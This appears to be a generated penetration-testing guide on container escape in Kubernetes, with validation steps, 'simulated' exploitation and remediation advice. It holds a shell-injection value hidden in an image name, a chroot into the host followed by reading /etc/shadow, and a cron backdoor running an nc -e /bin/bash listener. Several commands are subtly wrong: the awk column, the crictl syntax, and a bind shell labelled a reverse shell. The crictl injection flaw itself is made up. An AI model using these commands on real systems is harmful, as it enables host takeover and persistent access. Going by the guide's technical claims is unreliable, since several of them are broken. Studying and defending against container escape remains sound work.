# Kubernetes Penetration Testing: Container Runtime Vulnerability Exploitation

## 1. Overview Section

**Attack Vector Description:**

This vulnerability involves exploiting weaknesses within the container runtime environment (e.g., Docker, containerd, CRI-O) to gain unauthorized access or escalate privileges within the Kubernetes cluster. An attacker can leverage these vulnerabilities to escape the container sandbox and gain access to the underlying host system, other containers, or the entire Kubernetes cluster.  The exploitation often involves manipulating image configurations, exploiting resource handling bugs, or leveraging insecure default configurations within the runtime.

**Potential Impact and Consequences:**

Successful exploitation can lead to:

*   **Host System Compromise:**  Complete control over the worker node's operating system.
*   **Lateral Movement:** Ability to access other pods and services within the Kubernetes cluster.
*   **Data Exfiltration:** Theft of sensitive data stored within containers or accessible through network connections.
*   **Denial of Service (DoS):** Disruption of cluster services and application availability.
*   **Privilege Escalation:** Gaining cluster administrator privileges.
*   **Resource Consumption:**  Exhaustion of system resources like CPU, memory, and disk space.
*   **Container Escape:** Breaking out of the container namespace and accessing the host.

**Risk Level Assessment:**

*   **Critical** (If it allows container escape and host system compromise)
*   **High** (If it allows significant privilege escalation or data exfiltration within the cluster)

**Technical Explanation of Why This Vulnerability Exists:**

Container runtimes are complex software systems that manage the lifecycle of containers.  Vulnerabilities can arise due to:

*   **Coding Errors:** Bugs in the container runtime's code, such as buffer overflows, integer overflows, or use-after-free vulnerabilities.
*   **Insecure Defaults:** Container runtimes sometimes have default configurations that are not secure.
*   **Kernel Vulnerabilities:**  The container runtime relies on the host kernel for isolation. Vulnerabilities in the kernel can be exploited to escape the container sandbox.
*   **Misconfigurations:**  Incorrect configuration of the container runtime can weaken the security posture.
*   **Dependency Vulnerabilities:** Container runtimes often rely on third-party libraries. Vulnerabilities in these libraries can be exploited.
*   **Lack of Proper Validation:** Insufficient validation of container images or runtime configurations can lead to vulnerabilities.
*   **Namespace Breakout:**  Improper isolation and resource handling allows attackers to bypass container namespaces to gain access to the host OS.

**Prerequisites and Conditions Needed:**

*   **Vulnerable Container Runtime:**  A Kubernetes cluster using a vulnerable version of a container runtime (e.g., Docker, containerd, CRI-O).
*   **Access to a Pod:**  The attacker must have a foothold within a pod running on a worker node.  This could be achieved through application vulnerabilities, exposed services, or compromised credentials.
*   **Capabilities:**  The attacker might require certain Linux capabilities within the pod (e.g., `CAP_SYS_ADMIN`, `CAP_DAC_OVERRIDE`) to exploit the vulnerability.
*   **Network Access:**  Network access to the internet or other internal resources might be required for downloading exploit code or exfiltrating data.
*   **Knowledge of Container Internals:**  Understanding of container namespaces, cgroups, and other containerization technologies is helpful for exploiting these vulnerabilities.

## 2. Validation and Exploitation Steps Section

This section details how to validate and exploit a hypothetical container runtime vulnerability.  Specific commands and techniques will vary depending on the actual vulnerability being exploited. We'll demonstrate an example leveraging `crictl` and checking for improper image handling (simulated).  Keep in mind real-world exploitation might involve more sophisticated techniques and custom exploits.

**Phase 1: Vulnerability Validation**

This stage involves confirming the presence of the vulnerability within the Kubernetes environment.

1.  **Identify the Container Runtime:**

    ```bash
    kubectl get nodes -o wide | awk '{print $7}'
    ```

    *   **Explanation:** This command retrieves the container runtime running on each Kubernetes node.  The `kubectl get nodes -o wide` command displays detailed information about the nodes. The `awk` command filters the output to extract the seventh column, which contains the container runtime version.
    *   **Expected Output:** Output similar to:

        ```
        CONTAINER-RUNTIME
        docker://20.10.7
        containerd://1.4.6
        ```

    *   **Why:** Determining the container runtime and its version is the crucial first step to check for known vulnerabilities affecting that specific runtime.
    *   **Validation:** Check if the identified runtime and version are known to be vulnerable. Consult vulnerability databases (e.g., CVE Details, NVD) or vendor advisories for reported vulnerabilities.
    *   **Alternative:** If `kubectl` is not available, or access is restricted, you might be able to determine the runtime version from within a container by examining the `/proc/1/cgroup` file or using runtime-specific tools.

2.  **Access a Shell Inside a Pod:**

    ```bash
    kubectl exec -it <pod-name> -- /bin/bash
    ```

    *   **Explanation:** This command creates an interactive shell session within the specified pod. Replace `<pod-name>` with the name of the pod you have access to. This provides the initial access point for further investigation and exploitation.
    *   **Expected Output:** A shell prompt within the container's namespace (e.g., `root@<pod-name>:/#`).
    *   **Why:**  Gaining shell access allows you to run commands within the container, which is a necessary prerequisite for most container escape techniques.
    *   **Validation:** Successful access to the pod shell indicates that you can execute commands within the container's environment.
    *   **Alternative:** If `/bin/bash` is not available, try other shell options like `/bin/sh` or `ash`.

3.  **Check for `crictl` Availability:**

    ```bash
    which crictl
    ```

    *   **Explanation:** This command checks if the `crictl` utility (Container Runtime Interface CLI) is available within the container. `crictl` allows interacting with the container runtime directly.
    *   **Expected Output:** The full path to the `crictl` executable (e.g., `/usr/bin/crictl`) if it is available.  If not found, it will return nothing.
    *   **Why:** `crictl` can be a powerful tool for inspecting the container runtime and potentially exploiting vulnerabilities. Many older Docker containers may not have this utility, but `containerd` and CRI-O often do.
    *   **Validation:** If `crictl` is available, proceed to the next step. If not, you might need to explore alternative ways to interact with the runtime, which may be more challenging.
    *   **Alternative:** If `crictl` is not present, you could try installing it (if you have sufficient privileges). However, this is less common in real-world scenarios.

4.  **List Images (Simulated Vulnerability Check):**  Let's simulate an improperly sanitized image name handling vulnerability.  We'll try to list images with a specially crafted name.

    ```bash
    crictl images list --image "'; touch /tmp/pwned '"
    ```

    *   **Explanation:**  This command attempts to list images using `crictl`, but the image name includes shell metacharacters (`'`). This is a *simulated* scenario where the `crictl` command, or the underlying container runtime, might be vulnerable to command injection due to improper sanitization of the image name.  In reality, the command injection point could be in other `crictl` subcommands as well.
    *   **Expected Output:** If the vulnerability exists, this command *might* execute `touch /tmp/pwned` on the host system, or within a more privileged container, creating a file `/tmp/pwned`.  The `crictl` command might also return an error. If the system is properly secured, the command will likely fail, reporting a syntax error or invalid image name. *This is a demonstration; don't expect this to work directly. Real-world command injection is more subtle.*
    *   **Why:** This tests whether the container runtime properly sanitizes input parameters to prevent command injection. If the shell command embedded in the image name is executed, it indicates a severe vulnerability.
    *   **Validation:** Check for the existence of `/tmp/pwned`.

        ```bash
        ls -l /tmp/pwned
        ```

        If the file exists, it confirms the vulnerability. Even if `crictl` throws an error, the existence of `/tmp/pwned` is still a major indicator.  If the command fails and `/tmp/pwned` does *not* exist, the system is likely not vulnerable to this *specific* type of injection.
    *   **Alternative:** Try different shell metacharacters and commands to explore the extent of the command injection vulnerability (e.g., `$(whoami)`, `\`; id \``, etc.).

**Phase 2: Exploitation (Simulated)**

This phase demonstrates how to exploit the vulnerability, *assuming it exists* (based on successful validation).  This is a *simulated* exploit for demonstration purposes. Actual exploitation steps will vary significantly based on the specific vulnerability.

1.  **Escalate Privileges (Simulated):**

    ```bash
    chroot /host
    ```

    *   **Explanation:** *If* the container runtime vulnerability allowed you to escape the container and gain access to the underlying host's file system, you might attempt to use `chroot` to change the root directory to the host's root.  This command is only effective if you are already running with elevated privileges *outside* of the container's namespace, due to the vulnerability. `/host` typically represents the mounted host filesystem inside the container, but it depends on the configuration.
    *   **Expected Output:**  If successful, the shell prompt will change, reflecting the new root directory (e.g., `/`).  You can then navigate the host's file system. If the command fails (e.g., "chroot: failed to run command '/bin/bash': No such file or directory"), it indicates that you do not have sufficient privileges or the root directory is not mounted.
    *   **Why:**  This is a crucial step to gain full control over the host system.  If `chroot` is successful, you can modify system files, install software, and perform other administrative tasks.
    *   **Validation:** After running `chroot`, try accessing files on the host system (e.g., `/etc/shadow`).  If you can access these files, it confirms that you have successfully escaped the container.
    *   **Alternative:** Instead of `chroot`, you might need to use other techniques to gain access to the host file system, such as mounting the host's file system using `mount` (if you have the necessary capabilities).

2.  **Create a Backdoor (Simulated):**

    ```bash
    echo "*/1 * * * * root nc -l -p 4444 -e /bin/bash" >> /etc/crontab
    ```

    *   **Explanation:**  *Assuming* you've successfully gained root access to the host system (e.g., via `chroot`), this command adds a cron job that will execute `nc -l -p 4444 -e /bin/bash` every minute. This creates a reverse shell listener on port 4444. *Note: this is a simple example and might require modification depending on the host system's configuration.*
    *   **Expected Output:**  No direct output is expected.  The cron job should be added to `/etc/crontab`. You can verify this by examining the `/etc/crontab` file.
    *   **Why:**  This establishes persistence, allowing you to regain access to the host system even after the initial exploit is mitigated.
    *   **Validation:** Verify that the cron job has been added to `/etc/crontab`.  Then, from a remote machine, connect to port 4444 on the compromised host using `nc <host-ip> 4444`.  You should get a shell prompt.
    *   **Alternative:**  Instead of a cron job, you could create a systemd service or modify other system configuration files to achieve persistence.

**Remediation Recommendations:**

*   **Patch Container Runtimes:**  Upgrade to the latest stable versions of Docker, containerd, or CRI-O to address known vulnerabilities.  Regularly apply security patches.
*   **Secure Container Images:** Scan container images for vulnerabilities before deploying them.  Use trusted base images from reputable sources.
*   **Apply AppArmor or Seccomp Profiles:**  Restrict the capabilities of containers using AppArmor or Seccomp profiles.  These profiles limit the system calls that a container can make, reducing the attack surface.
*   **Use Namespaces and Cgroups:** Ensure that containers are properly isolated using namespaces and cgroups.
*   **Principle of Least Privilege:**  Grant containers only the necessary privileges. Avoid running containers as root.
*   **Regular Security Audits:**  Conduct regular security audits of your Kubernetes infrastructure to identify and address potential vulnerabilities.
*   **Network Segmentation:** Implement network segmentation to isolate sensitive workloads and limit lateral movement in case of a compromise.
*   **Monitor Container Runtime Events:**  Monitor container runtime events for suspicious activity. Use tools like Falco to detect and respond to security threats.
*   **Update Kubernetes Components:**  Keep Kubernetes components (kubelet, kube-apiserver, etc.) up to date with the latest security patches.
*   **Implement Runtime Protection Tools:**  Consider using runtime protection tools that can detect and prevent container escape attempts.
*   **Immutable Infrastructure:** Design your infrastructure to be immutable where possible, to limit the ability of attackers to make changes to systems.
